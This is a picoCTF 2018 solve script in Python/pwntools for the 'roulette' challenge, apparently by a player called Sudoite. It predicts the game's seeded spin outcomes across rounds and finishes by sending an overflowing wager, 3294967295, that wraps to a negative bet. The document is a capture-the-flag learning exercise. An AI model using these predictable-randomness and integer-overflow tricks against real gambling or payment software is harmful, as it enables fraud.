
## Exploit Roulette
## by Sudoite

from pwn import *
from pprint import pprint

## Technically, this code should work to get the flag remotely, but it's 
## faster just to get the necessary random numbers locally and then use them
## manually as input for the server.

local = True

def spawn_process(local=True):
	if local:
		p=process('./roulette_fast_x86')
	else:
		p = remote('2018shell2.picoctf.com', 26662)

	return p

def get_starting_money(p):
	p.recvuntil("$")
	starting_money = int(p.recvuntil(" "))
	log.info("starting money is " + str(starting_money))
	return(starting_money)

def spin(wager, p):
	p.send(str(wager) + "\n")
	p.recvuntil("Spinning")
	p.recvline()
	p.recvline()
	spinresult = p.recvuntil("\n")
	# int() doesn't work cleanly on input that starts with "\x08"
	if spinresult[len(spinresult)-3] == "\x08":
		result = int(spinresult[len(spinresult)-2:len(spinresult)])
	else:
		result = int(spinresult[len(spinresult)-3:len(spinresult)])
	print("spin result = " + spinresult)
	print("winning number = " + str(result))
	return(result)

lose_messages = {"WRONG\n","Nice try..\n","YOU LOSE\n","Not this time..\n","Better luck next time...\n"}

# one in 36 times the last round bet will succeed, but I don't care, this will usually work.
def play_last_round(p, starting_money, money, round_number):
	p.recvuntil("> ")
	#if local:
	#	p.send("18446744072709551615\n") # -1000000001 as an unsigned long (for a 64-bit not 32-bit application)
	#else:
	p.send("3294967295\n") # for 32-bit application
	p.recvuntil("> ")
	guess = 20
	result = spin(guess, p)
	p.interactive()
	return money, round_number

def play_round(p, starting_money, money, round_number):
	p.recvuntil("> ")
	p.send(str(money)+"\n")
	p.recvuntil("> ")
	if starting_money in seed_dictionary and len(seed_dictionary[starting_money]) > round_number:
		log.info("Guessing a pre-existing value: " + str(seed_dictionary[starting_money][round_number]))
		log.info("Starting money = " + str(starting_money))
		log.info("round_number = " + str(round_number))
		guess = seed_dictionary[starting_money][round_number]
	else:
		guess = 20
	result = spin(guess, p)
	log.info("result = " + str(result))
	if len(seed_dictionary[starting_money]) < round_number:
		log.info("ERROR: length of seed_dictionary["+str(starting_money) + "] < " + str(round_number))
		exit(0)
	elif len(seed_dictionary[starting_money]) == round_number:
		seed_dictionary[starting_money].append(result)
	p.recvline()
	result_message = p.recvline()
	print("result_message = " + result_message)
	if result_message in lose_messages:
		print("seed_dictionary: ")
		pprint(seed_dictionary)
		if local:
			p.kill()
		else:
			p.close()
		round_number = 0
	else:
		print("collision! round_number = " + str(round_number) + ", starting money = " + str(starting_money) + ", guess = " + str(guess))
		print("seed_dictionary: ")
		pprint(seed_dictionary)
		if len(seed_dictionary[starting_money]) == round_number: # got lucky and guessed 20
			seed_dictionary[starting_money].append(result)
		money *= 2
		round_number += 1
	return money, round_number

def play_game():
	round_number = 0
	while True:
		if round_number == 0:
			p = spawn_process(local=local)
			starting_money = get_starting_money(p)
			money = starting_money
			if starting_money not in seed_dictionary:
				seed_dictionary[starting_money] = []
		money, round_number = play_round(p, starting_money, money, round_number)
		if round_number >= 3:
			money, round_number = play_last_round(p, starting_money, money, round_number)
		print("returned from round " + str(round_number-1))


seed_dictionary = {}
round = 0
done = False

while not done:
	play_game()
	# Just break out when we get the flag locally

